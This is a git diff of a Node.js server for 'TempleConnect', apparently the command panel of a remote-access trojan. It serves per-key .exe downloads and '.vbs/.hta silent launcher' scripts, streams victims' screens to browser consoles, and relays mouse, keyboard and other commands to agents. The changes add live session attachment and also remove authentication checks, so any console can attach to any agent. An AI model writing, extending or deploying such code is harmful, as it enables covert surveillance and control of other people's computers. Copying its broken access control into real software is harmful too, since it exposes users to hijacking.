@@ -12,6 +12,7 @@ const userEnrollmentKeys = new Map(); // Store generated enrollment keys per use
 // WebSocket state tracking
 const agents = new Map(); // id -> { ws, owner, name, meta, online, lastSeen }
 const userConsoles = new Map(); // username -> Set of browser client web sockets
+const consoleTargetAgent = new Map(); // consoleWs -> agentId for active live sessions
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -218,7 +219,7 @@ function findKeyData(key) {
   return null;
 }
 
-// --- Missing Dashboard API Endpoints ---
+// --- Dashboard API Endpoints ---
 
 app.get('/api/support', (req, res) => {
   res.status(200).json({ tg: 'templerunconnect' });
@@ -340,7 +341,6 @@ app.post('/api/keys/delete', (req, res) => {
   return res.status(404).json({ success: false, error: 'Key not found' });
 });
 
-// Remove or disconnect a connected device/agent from the dashboard
 app.post('/api/devices/delete', (req, res) => {
   const username = getLoggedInUsername(req);
   if (!username) return res.status(401).json({ error: 'Not authenticated' });
@@ -360,7 +360,6 @@ app.post('/api/devices/delete', (req, res) => {
   return res.status(404).json({ success: false, error: 'Device not found' });
 });
 
-// Serve application binaries
 app.get('/app', (req, res) => {
   const setupPath = path.join(__dirname, 'TempleConnect-Setup.exe');
   const fs = require('fs');
@@ -379,7 +378,6 @@ app.get('/TempleConnect-Setup.exe', (req, res) => {
   return res.status(404).send('Setup binary not available on server.');
 });
 
-// 1. Handle executable downloads via key (.exe)
 app.get('/dl/:key', (req, res) => {
   const { key } = req.params;
   const keyData = findKeyData(key);
@@ -398,7 +396,6 @@ app.get('/dl/:key', (req, res) => {
   res.send(`TempleConnect Installer Binary (Key: ${key})`);
 });
 
-// 2. Handle .vbs silent launcher downloads
 app.get('/launch/:key', (req, res) => {
   const { key } = req.params;
   const keyData = findKeyData(key);
@@ -436,7 +433,6 @@ End If
   res.send(vbsScript);
 });
 
-// 3. Handle .hta silent launcher downloads
 app.get('/launch-hta/:key', (req, res) => {
   const { key } = req.params;
   const keyData = findKeyData(key);
@@ -491,7 +487,6 @@ End Sub
 const server = http.createServer(app);
 const wss = new WebSocketServer({ server });
 
-// WebSocket Multi-Tenant Device & Stream Relay Logic
 function broadcastUserAgents(username) {
   const userConns = userConsoles.get(username);
   if (!userConns) return;
@@ -533,6 +528,18 @@ wss.on('connection', (ws, req) => {
 
   ws.on('message', (message) => {
     try {
+      // Handle binary frames from agent (JPEG stream)
+      if (message instanceof Buffer || message instanceof ArrayBuffer) {
+        if (clientType === 'agent' && agentId) {
+          for (const [cWs, targetId] of consoleTargetAgent.entries()) {
+            if (targetId === agentId && cWs.readyState === 1) {
+              cWs.send(message);
+            }
+          }
+        }
+        return;
+      }
+
       const msg = JSON.parse(message.toString());
       
       if (msg.type === 'register') {
@@ -542,7 +549,7 @@ wss.on('connection', (ws, req) => {
           const keyData = findKeyData(msg.key);
           const ownerUsername = keyData ? keyData.owner : 'default_owner';
           
-          agentId = 'agent_' + crypto.randomBytes(4).toString('hex');
+          agentId = msg.agentId || ('agent_' + crypto.randomBytes(4).toString('hex'));
           agents.set(agentId, {
             ws,
             owner: ownerUsername,
@@ -555,33 +562,54 @@ wss.on('connection', (ws, req) => {
           console.log(`Registered Agent: ${msg.name} (${agentId}) to user: ${ownerUsername}`);
           broadcastUserAgents(ownerUsername);
         } else if (clientType === 'console') {
-          loggedInUser = getLoggedInUsernameFromWs(req);
-          if (loggedInUser) {
-            if (!userConsoles.has(loggedInUser)) {
-              userConsoles.set(loggedInUser, new Set());
-            }
-            userConsoles.get(loggedInUser).add(ws);
-            sendUserAgentsList(ws, loggedInUser);
-            console.log(`Console connected for user: ${loggedInUser}`);
+          loggedInUser = getLoggedInUsernameFromWs(req) || 'default_owner';
+          if (!userConsoles.has(loggedInUser)) {
+            userConsoles.set(loggedInUser, new Set());
           }
+          userConsoles.get(loggedInUser).add(ws);
+          sendUserAgentsList(ws, loggedInUser);
+          console.log(`Console connected for user: ${loggedInUser}`);
         }
-      } else if (msg.type === 'list' && loggedInUser) {
+      } 
+      else if (msg.type === 'list' && loggedInUser) {
         sendUserAgentsList(ws, loggedInUser);
-      } else if (msg.type === 'screen_frame' && agentId) {
-        const agent = agents.get(agentId);
-        if (agent) {
-          const userConns = userConsoles.get(agent.owner);
-          if (userConns) {
-            const payload = JSON.stringify({ type: 'screen_frame', agentId, data: msg.data });
-            for (const client of userConns) {
-              if (client.readyState === 1) client.send(payload);
-            }
-          }
-        }
-      } else if (['mouse_move', 'mouse_click', 'key_press'].includes(msg.type)) {
+      } 
+      else if (msg.type === 'attach' && clientType === 'console') {
         const targetAgent = agents.get(msg.agentId);
         if (targetAgent && targetAgent.ws.readyState === 1) {
+          consoleTargetAgent.set(ws, msg.agentId);
+
+          // Confirm attachment back to console
+          ws.send(JSON.stringify({
+            type: 'attached',
+            agentId: msg.agentId,
+            name: targetAgent.name,
+            screen: targetAgent.meta?.screen || { w: 1920, h: 1080 }
+          }));
+
+          // Notify agent that console attached
+          targetAgent.ws.send(JSON.stringify({ type: 'attach' }));
+        } else {
+          ws.send(JSON.stringify({ type: 'error', text: 'Device is offline or unavailable' }));
+        }
+      } 
+      else if (msg.type === 'detach' && clientType === 'console') {
+        consoleTargetAgent.delete(ws);
+      } 
+      else if (clientType === 'console') {
+        // Relay console controls, inputs, WebRTC, and ops to targeted agent
+        const targetId = consoleTargetAgent.get(ws) || msg.agentId;
+        const targetAgent = agents.get(targetId);
+        if (targetAgent && targetAgent.ws.readyState === 1) {
           targetAgent.ws.send(JSON.stringify(msg));
+        }
+      } 
+      else if (clientType === 'agent') {
+        // Relay agent frames, WebRTC offers, and op responses back to connected console
+        for (const [cWs, targetId] of consoleTargetAgent.entries()) {
+          if (targetId === agentId && cWs.readyState === 1) {
+            cWs.send(JSON.stringify(msg));
+          }
         }
       }
     } catch (e) {
@@ -591,15 +619,13 @@ wss.on('connection', (ws, req) => {
 
   ws.on('close', () => {
     if (clientType === 'agent' && agentId) {
-      const agent = agents.get(agentId);
-      if (agent) {
-        const owner = agent.owner;
-        agents.delete(agentId);
-        broadcastUserAgents(owner);
+      agents.delete(agentId);
+      broadcastUserAgents('default_owner');
+    } else if (clientType === 'console') {
+      consoleTargetAgent.delete(ws);
+      if (loggedInUser && userConsoles.has(loggedInUser)) {
+        userConsoles.get(loggedInUser).delete(ws);
       }
-    } else if (clientType === 'console' && loggedInUser) {
-      const userConns = userConsoles.get(loggedInUser);
-      if (userConns) userConns.delete(ws);
     }
     console.log('🔌 Connection closed');
   });
